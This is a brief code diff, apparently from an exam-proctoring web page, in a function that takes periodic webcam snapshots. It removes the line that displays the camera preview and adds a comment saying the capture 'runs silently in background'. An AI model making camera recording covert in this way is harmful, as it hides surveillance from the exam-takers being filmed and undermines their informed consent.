@@ -108,7 +108,7 @@ function startCameraSnapshots() {
 
     const video = document.getElementById('examCameraVideo');
     video.srcObject = cameraStream;
-    document.getElementById('examCameraPreview').style.display = 'block';
+    // Camera preview stays hidden - runs silently in background
 
     // Capture snapshot every 25 minutes (1500 seconds)
     snapshotInterval = setInterval(() => {
